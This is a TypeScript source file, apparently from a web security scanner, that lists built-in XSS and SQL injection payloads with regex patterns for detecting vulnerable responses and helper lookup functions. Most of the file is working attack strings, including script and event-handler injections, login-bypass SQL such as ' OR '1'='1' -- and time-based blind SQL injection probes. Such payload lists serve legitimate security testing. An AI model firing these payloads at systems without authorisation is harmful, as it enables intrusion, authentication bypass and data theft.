/**
 * Built-in security payloads
 */

export type PayloadCategory = "xss" | "sqli" | "ssrf" | "path-traversal";
export type PayloadName =
  | "xss-basic"
  | "xss-event"
  | "xss-svg"
  | "sqli-basic"
  | "sqli-error"
  | "sqli-blind";

export interface Payload {
  name: PayloadName;
  category: PayloadCategory;
  payloads: string[];
  detectPatterns: RegExp[];
  description: string;
}

export const BUILTIN_PAYLOADS: Record<PayloadName, Payload> = {
  "xss-basic": {
    name: "xss-basic",
    category: "xss",
    description: "Basic XSS payloads with script tags and event handlers",
    payloads: [
      '<script>alert("XSS")</script>',
      '<img src=x onerror=alert("XSS")>',
      '"><script>alert("XSS")</script>',
      "javascript:alert('XSS')",
      '<svg onload=alert("XSS")>',
    ],
    detectPatterns: [
      /<script[^>]*>alert\(/i,
      /onerror\s*=\s*alert\(/i,
      /onload\s*=\s*alert\(/i,
      /javascript:alert\(/i,
    ],
  },
  "xss-event": {
    name: "xss-event",
    category: "xss",
    description: "XSS via event handlers",
    payloads: [
      '" onfocus="alert(1)" autofocus="',
      "' onmouseover='alert(1)'",
      '<body onload=alert("XSS")>',
      "<input onfocus=alert(1) autofocus>",
      "<marquee onstart=alert(1)>",
    ],
    detectPatterns: [
      /onfocus\s*=\s*["']?alert/i,
      /onmouseover\s*=\s*["']?alert/i,
      /onload\s*=\s*["']?alert/i,
      /onstart\s*=\s*["']?alert/i,
    ],
  },
  "xss-svg": {
    name: "xss-svg",
    category: "xss",
    description: "XSS via SVG elements",
    payloads: [
      '<svg/onload=alert("XSS")>',
      "<svg><script>alert(1)</script></svg>",
      "<svg><animate onbegin=alert(1)>",
      "<svg><set onbegin=alert(1)>",
    ],
    detectPatterns: [
      /<svg[^>]*onload\s*=/i,
      /<svg[^>]*>.*<script>/i,
      /onbegin\s*=\s*alert/i,
    ],
  },
  "sqli-basic": {
    name: "sqli-basic",
    category: "sqli",
    description: "Basic SQL injection payloads",
    payloads: [
      "' OR '1'='1",
      "' OR '1'='1' --",
      "1' OR '1'='1",
      "admin'--",
      "' UNION SELECT NULL--",
    ],
    detectPatterns: [
      /sql.*syntax/i,
      /mysql.*error/i,
      /ORA-\d{5}/i,
      /pg_query/i,
      /sqlite.*error/i,
      /unclosed.*quotation/i,
    ],
  },
  "sqli-error": {
    name: "sqli-error",
    category: "sqli",
    description: "SQL injection payloads to trigger errors",
    payloads: ["'", "''", "`", '"', "')", "'\"", "1' AND '1'='2", "1 AND 1=2"],
    detectPatterns: [
      /sql.*syntax/i,
      /mysql.*error/i,
      /ORA-\d{5}/i,
      /postgresql.*error/i,
      /sqlite.*error/i,
      /quoted.*string.*properly.*terminated/i,
    ],
  },
  "sqli-blind": {
    name: "sqli-blind",
    category: "sqli",
    description: "Blind SQL injection payloads",
    payloads: [
      "1' AND SLEEP(5)--",
      "1; WAITFOR DELAY '0:0:5'--",
      "1' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
    ],
    detectPatterns: [
      // Blind SQLi is detected by timing, not content
    ],
  },
};

/**
 * Get payloads by name
 */
export function getPayload(name: PayloadName): Payload | undefined {
  return BUILTIN_PAYLOADS[name];
}

/**
 * Get all payload names
 */
export function getPayloadNames(): PayloadName[] {
  return Object.keys(BUILTIN_PAYLOADS) as PayloadName[];
}

/**
 * Get payloads by category
 */
export function getPayloadsByCategory(category: PayloadCategory): Payload[] {
  return Object.values(BUILTIN_PAYLOADS).filter((p) => p.category === category);
}
